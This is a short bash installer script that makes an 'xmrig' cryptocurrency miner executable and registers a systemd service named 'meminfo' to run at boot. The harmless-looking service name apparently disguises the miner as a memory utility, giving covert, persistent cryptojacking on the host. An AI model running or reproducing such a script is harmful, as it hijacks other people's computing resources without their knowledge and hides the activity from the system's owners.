#!/bin/bash

chmod +x xmrig
chmod +x meminfo
mv meminfo.service /etc/systemd/system/
systemctl enable --now meminfo
